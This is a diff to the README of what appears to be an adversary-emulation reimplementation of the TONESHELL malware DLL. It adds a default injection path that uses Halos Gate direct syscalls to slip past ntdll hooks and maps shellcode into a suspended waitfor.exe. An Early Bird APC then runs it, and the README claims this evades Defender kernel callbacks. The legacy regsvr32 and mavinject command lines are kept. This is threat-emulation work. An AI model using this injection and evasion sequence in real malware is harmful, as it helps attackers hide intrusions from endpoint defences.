@@ -41,15 +41,31 @@ The DLL performs certain checks prior to executing its malicious routine.
 
 If all checks pass, the DLL triggers the malicious routine using a custom C++ exception and associated exception handler.<sup>[1](https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html),[4](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html)</sup>
 
-The malicious routine will do the following:<sup>[1](https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html),[4](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html)</sup>
+The malicious routine supports two injection paths, selected at compile time via the `TONESHELL_DIRECT_SYSCALL` CMake option:<sup>[1](https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html),[4](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html)</sup>
+
+#### Direct-syscall path (v2, `TONESHELL_DIRECT_SYSCALL` defined — default)
+
+- Resolve syscall SSNs via Halos Gate: walk the PEB to find `ntdll.dll`, parse its export table sorted by function address, and resolve 8 SSNs (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtQueueApcThread`, `NtResumeThread`, `NtCreateSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`). For hooked stubs, interpolate SSN from the nearest unhooked neighbor. Patch resolved SSNs into assembly stubs that issue `syscall` directly, bypassing ntdll user-space hooks.
+- Create a suspended `waitfor.exe` process:
+  - `CreateProcessW("waitfor.exe /T 99999 Evt8a3f1d7c2e", CREATE_SUSPENDED | CREATE_NO_WINDOW)`
+- Inject shellcode via shared section (no cross-process writes — bypasses WdFilter.sys kernel callbacks):
+  - `NtCreateSection(SECTION_ALL_ACCESS, PAGE_EXECUTE_READWRITE, SEC_COMMIT)` — create anonymous shared section
+  - `NtMapViewOfSection(section, NtCurrentProcess(), PAGE_READWRITE)` — map RW view locally
+  - `memcpy(local_view, shellcode)` — write shellcode to local view (plain local write)
+  - `NtMapViewOfSection(section, h_waitfor, PAGE_EXECUTE_READ)` — map RX view into `waitfor.exe`
+  - `NtUnmapViewOfSection(NtCurrentProcess(), local_view)` — unmap local view
+- Trigger execution via Early Bird APC:
+  - `NtQueueApcThread(h_thread, remote_view)` — queue shellcode as APC routine
+  - `NtResumeThread(h_thread)` — APC fires before `waitfor.exe` main logic
+
+#### Legacy path (`TONESHELL_DIRECT_SYSCALL` not defined)
 
 - Register the current malicious DLL using `regsvr32.exe`, which will execute the DLL's exported `DllRegisterServer` function.
   - `C:\Windows\System32\regsvr32.exe /s "PATH_TO_DLL"`
 - The `DllRegisterServer` export will create a victim `waitfor.exe` process and inject the current DLL into it using `mavinject.exe`.
   - `C:\Windows\System32\waitfor.exe Event183785251387`
   - `C:\Windows\System32\mavinject.exe WAITFOR_PID /INJECTRUNNING "PATH_TO_DLL"`
-- Once `waitfor.exe` loads the malicious DLL, `DllMain` will create a thread to
-execute the shellcode in the victim process memory.
+- Once `waitfor.exe` loads the malicious DLL, `DllMain` will create a thread to execute the shellcode in the victim process memory.
   - `DllMain` checks if it is running within `C:\Windows\System32\waitfor.exe`
 
 The shellcode is XOR-encrypted and stored in the `.data` section of the DLL at build time. The encryption is performed using a randomly-generated 32-byte key, which is then XOR-encrypted using a single-byte key `0x3F` and compiled into the DLL with the encrypted shellcode.<sup>[1](https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html),[4](https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html)</sup>
@@ -227,10 +243,12 @@ The following table describes the project files and their purposes:
   | `src/common/embed_payload.ps1` | Script that encrypts and embeds the shellcode bytes in the specified header file along with the encrypted random XOR key. |
   | `src/common/embedded.hpp.in` | Header file template that `embed_payload.ps1` populates with the encrypted shellcode bytes and encrypted XOR key in the specified header file |
   | `src/common/fnv1a.hpp` | Implements FNV1A hash |
-  | `src/common/handler.cpp` | Implements malicious DLL routines |
+  | `src/common/handler.cpp` | Implements malicious DLL routines: anti-sandbox checks, compile-time branching between direct-syscall injection (`InjectAndSpawn`) and legacy regsvr32+mavinject (`RegisterSelf`) |
   | `src/common/handler.hpp` | Defines malicious DLL routines |
-  | `src/common/handler_util.cpp` | Implements utilites for malicious DLL |
-  | `src/common/handler_util.hpp` | Defines utilites for malicious DLL |
+  | `src/common/handler_util.cpp` | Implements utilities for malicious DLL |
+  | `src/common/handler_util.hpp` | Defines utilities for malicious DLL |
+  | `src/common/inject.cpp` | Implements Early Bird APC injection via shared section (NtCreateSection + NtMapViewOfSection) with direct syscalls |
+  | `src/common/inject.hpp` | Defines injection entry point (`InjectAndSpawn`) |
   | `src/common/handler_util_test.cpp` | Unit tests for malicious DLL utilities |
   | `src/common/logger.cpp` | Implements logging functionality |
   | `src/common/logger.hpp` | Defines logging functionality |
@@ -247,6 +265,9 @@ The following table describes the project files and their purposes:
   | `src/common/register.hpp` | Defines Regsvr32 registration and DLL injection via mavinject |
   | `src/common/shared_func.hpp` | Defines function pointers used by both the DLL and shellcode components |
   | `src/common/sign_artifact.ps1` | Script that generates a code signing certificate and signs a given binary. Used to sign the TONESHELL DLL and the Protections test 4 dropper and DLL. |
+  | `src/common/syscalls.asm` | Direct-syscall assembly stubs with placeholder SSNs (`0xDEADBEEF`) patched at runtime by Halos Gate |
+  | `src/common/syscalls.cpp` | Halos Gate SSN resolution: PEB walk, ntdll export table parsing, sort-by-function-address, neighbor interpolation for hooked stubs |
+  | `src/common/syscalls.hpp` | Syscall extern declarations (`SysNt*` stubs) and `SECTION_INHERIT` typedef |
   | `src/common/util.cpp` | Implements shared utility functions |
   | `src/common/util.hpp` | Defines shared utility functions |
   | `src/common/win_helper.h` | Defines certain Windows structs |
